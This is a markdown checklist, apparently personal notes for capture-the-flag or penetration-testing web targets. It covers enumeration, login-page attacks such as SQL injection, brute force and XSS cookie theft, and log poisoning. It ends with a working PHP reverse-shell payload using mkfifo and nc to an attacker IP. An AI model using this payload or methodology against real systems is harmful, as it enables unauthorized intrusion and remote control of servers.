- [ ]  Web scanning

- [ ]    Robots.txt

- [ ]   View source code

 - [ ]  Hidden Values

- [ ]  Developer Remarks

- [ ]    Extraneous Code

- [ ] Checkout what the web display

- [ ]  Read entire pages. Enumerate for emails, names, user info etc.

- [ ]   Directory discovery

- [ ]  Enum the interface, version of CMS? Server installation page?

- [ ]   Potential vulnerability? LFI, RFI, XEE, Upload?

- [ ]   Default web server page, version information

- [ ]   Passwords

# conditional 
- [ ]  [[HTTP(S)]]
- [ ] [[Directory discovery]]
- [ ] HTTPS certificate 


## Login page

### Steps
-   1. SQL injection


-   2. Bruteforce authentication
 

-   3. Plaintext password
 

-   4.  Credential somewhere in the box

- [ ]   View source code
 

- [ ]    Use default password
 

- [ ]   Brute force directory first (sometime you don't need to login to pwn the machine)
  

- [ ]   Search credential by bruteforce directory


- [ ]    bruteforce credential


- [ ]   Search credential in other service port
 

- [ ]   Enumeration for the credential


- [ ]   Register first

- [ ]  Forget password feature 
 

- [ ]   SQL injection


- [ ]   XSS can be used to get the admin cookie


- [ ]   Bruteforce session cookie


## If you get local file inclusion for log, you maybe can log poisoning the log



```
<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.12 4444 >/tmp/f') ?>
```